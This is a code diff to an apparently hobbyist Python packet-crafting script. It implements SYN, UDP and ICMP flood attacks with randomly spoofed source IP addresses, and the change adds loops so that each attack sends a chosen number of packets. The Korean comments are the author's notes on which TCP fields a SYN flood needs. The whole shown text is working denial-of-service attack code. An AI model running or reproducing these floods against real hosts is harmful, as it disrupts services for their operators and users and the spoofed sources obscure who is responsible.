@@ -31,48 +31,47 @@ def main():
     else:
         print("Attack Type is Missing")
         return
-
 def randomSrcIP():
     ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
     return ip 
 
 def SynFlood(dstIP,dstPort,repeat):
-    IP_Packet = IP()
-    IP_Packet.src = randomSrcIP()
-    IP_Packet.dst = dstIP
+    for x in range(int(repeat)):
+        IP_Packet = IP()
+        IP_Packet.src = randomSrcIP()
+        IP_Packet.dst = dstIP
 
-    # 공격 필수 요소만 탑재하도록
-    # SYN Flood Attack시 꼭 필요한게 무엇일까?
-    # window, seq,src port 꼭 필요한가?
-    TCP_Packet = TCP()
-    TCP_Packet.sport = 80 # default port : 20
-    TCP_Packet.dport = dstPort
-    TCP_Packet.flags = "S"
-    # TCP_Packet.seq = # default seq : 0
-    # TCP_Packet.window # default window : 8192
-    # ls(TCP_Packet) 
-    
-    # WARNING: Mac address to reach destination not found. Using broadcast.//IP 주소 설정 안하면 뜨던데?
-    send(IP_Packet/TCP_Packet,verbose=0)
+        # 공격 필수 요소만 탑재하도록
+        # SYN Flood Attack시 꼭 필요한게 무엇일까?
+        # window, seq,src port 꼭 필요한가?
+        TCP_Packet = TCP()
+        TCP_Packet.sport = 80 # default port : 20
+        TCP_Packet.dport = dstPort
+        TCP_Packet.flags = "S"
+        # TCP_Packet.seq = # default seq : 0
+        # TCP_Packet.window # default window : 8192
+        # ls(TCP_Packet) 
+        # WARNING: Mac address to reach destination not found. Using broadcast.//IP 주소 설정 안하면 뜨던데?
+        send(IP_Packet/TCP_Packet,verbose=0)
 
 def UDPFlood(dstIP,dstPort,repeat):
-    IP_Packet = IP()
-    IP_Packet.src = randomSrcIP()
-    IP_Packet.dst = dstIP
+    for x in range(int(repeat)):
+        IP_Packet = IP()
+        IP_Packet.src = randomSrcIP()
+        IP_Packet.dst = dstIP
 
-    UDP_Packet = UDP()
-    UDP_Packet.sport = 80
-    UDP_Packet.dport = dstPort
-    send(IP_Packet/UDP_Packet,verbose=0)
+        UDP_Packet = UDP()
+        UDP_Packet.sport = 80
+        UDP_Packet.dport = dstPort
+        send(IP_Packet/UDP_Packet,verbose=0)
 
 def ICMPFlood(dstIP,repeat):
-    IP_Packet = IP()
-    IP_Packet.src = randomSrcIP()
-    IP_Packet.dst = dstIP
+    for x in range(int(repeat)):
+        IP_Packet = IP()
+        IP_Packet.src = randomSrcIP()
+        IP_Packet.dst = dstIP
 
-    ICMP_Packet = ICMP()
-    ls(ICMP)
-    send(IP_Packet/ICMP(),verbose=0)
-
+        ICMP_Packet = ICMP()
+        send(IP_Packet/ICMP(),verbose=0)
 
 main()
